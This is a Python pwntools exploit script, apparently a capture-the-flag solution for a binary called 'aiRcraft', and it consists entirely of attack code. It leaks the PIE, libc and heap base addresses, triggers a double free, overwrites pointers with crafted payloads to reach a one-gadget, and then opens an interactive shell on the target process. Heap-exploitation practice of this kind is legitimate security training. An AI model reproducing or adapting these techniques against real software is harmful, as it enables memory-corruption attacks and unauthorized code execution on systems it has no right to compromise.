# http://nextline.tistory.com/138
from pwn import *

s = process('./aiRcraft')

def sendmsg(msg):
	s.recvuntil(':')
	s.sendline(msg)

def buy(company,name):
	sendmsg('1')
	sendmsg(company)
	sendmsg(name)

def build(size , name):
	sendmsg('2')
	s.recvuntil('?')
	s.sendline(size)
	sendmsg(name)

def enter(airport,index): # airport
	sendmsg('3')
	s.recvuntil('?')
	s.sendline(airport)
	sendmsg(index)

def select_fly(name,airport): # fly_plane
	sendmsg('4')
	s.recvuntil('?')
	s.sendline(name)
	sendmsg('1')
	s.recvuntil('?')
	s.sendline(airport)
	sendmsg('3')

def sell_plane(name): # sell_plane
	sendmsg('4')
	s.recvuntil('?')
	s.sendline(name)
	sendmsg('2')

def leak(name,airport):
    sendmsg('4')
    s.recvuntil('?')
    s.sendline(name)
    sendmsg('1')
    s.recvuntil('?')
    s.sendline('0')

########## PIE_BASE LEAK ##########
buy('1','A')
buy('1','B')
buy('1','F')
buy('1','G')
sell_plane('A')
build('64', 'C' * 64)
leak('B','0')
s.recvuntil('C' * 64)
pie_base = u64(s.recv(8)[:-2] + "\x00" * 2) - 0xb7d
airport_list = pie_base + 0x202080
free_got = pie_base + 0x201F70
first_fd = pie_base + 0x202100
first_fd = pie_base + 0x202000
log.info("PIE BASE : " + hex(pie_base))
s.sendline('3')
enter('0','2')

########## DOUBLE FREE ##########
buy('1','A')
buy('1','B')
build('32','AAAA')
select_fly('A', '1')
select_fly('B', '1')
select_fly('A', '1')
enter('1','2')
build('32','BBBB')
build('32','CCCC')
buy('1','C')
select_fly('C','2')
select_fly('C','3')
buy('1','B')

########## LIBC LEAK ##########
payload = 'C' * 1 + '\x00' * 31
payload += p64(free_got) + p64(free_got) + p64(first_fd)
build('64',payload)
enter('2','1')
s.recvuntil('Build by ')
libc_base = u64(s.recv(8)[:-2] + "\x00" * 2) - 538944
oneshot = libc_base + 0x4526a
malloc_hook = libc_base + 0x3c3b10
log.info("LIBC BASE : " + hex(libc_base))
s.sendline('3')

########## HEAP LEAK ##########
enter('2','2')
payload = 'C' * 1 + '\x00' * 31
payload += p64(airport_list) + p64(airport_list) + p64(first_fd)
build('64',payload)
enter('3','1')
s.recvuntil('Build by ')
heap_leak = u64(s.recv(8)[:-2] + "\x00" * 2) - 0x60
log.info("HEAP BASE : " + hex(heap_leak))
s.sendline('3')

########## Exploit ##########
build('16','EEEE')
select_fly('F','6')
select_fly('G','6')
select_fly('F','6')
enter('6','2')
buy('1',p64(heap_leak))
buy('1','A')
buy('1','A')
payload = 'C' * 1 + '\x00' * 31
payload += p64(airport_list) + p64(airport_list) + p64(first_fd) * 2
payload += p64(oneshot)
build('72',payload)
sell_plane('C')
s.recv(1024)
s.recv(1024)
s.interactive()
